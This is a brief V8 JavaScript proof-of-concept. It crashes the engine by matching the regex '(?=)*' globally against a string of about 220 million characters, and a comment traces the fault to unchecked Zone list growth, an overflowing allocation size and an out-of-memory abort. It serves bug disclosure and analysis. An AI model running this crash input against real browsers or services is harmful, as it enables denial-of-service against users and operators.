// Owner: Choongwoo Han
// v8 version: *, this PoC generate segfault with several v8s.

var r2 = new RegExp("(?=)*", "g");
var s0 = Array(220000700).join('a');
var result = s0.match(r2);

/*
Zone: fast allocation of small chunks of memory.
It cannot be decallocated individually, but instead the Zone supports deallocating all chunks  
in one fast operation.
It used to hold temporary data structures like AST, which is decallocated after compilation.

==> malloc is requested.


Step 1. make regexp (anything). anyway 'g' flag searches all possible matched strings.
Step 2. make large array and join('a')
	- why size of array is 220000700?
Step 3. s0.match(r2)

Zonelist<int> offsets(8, zone());
while(true) {
    ...
    offsets.Add(match[0], zone_scope.zone());
    offsets.Add(match[1], zone_scope.zone());
}

Add -> if exceed capacity of offsets,resize (expand)
But, no size limitation check.

1. 	new_capcaity = 1 + 2 * capacity_;
	Resize(new_capacity, ...);

2.	T* new_data = NewData(new_capacity, ..); ==> allocator.New(n * sizeof(T)); ==> n * sizeof(T) = 0xffffd1f4
	OS::MemCopy(new_data, data_, length_ * sizeof(T));
	List<T, P>::DeleteData(data_);
	data_ = new_data;
	capacity_ = new_capacity;

3. 	if (new_size_no_overhead < size || new_size < kSegmentOverhead) {
		v8::FatalProcessOutOfMemory("Zone"); <-- meet this
		return NULL;
	}


*/
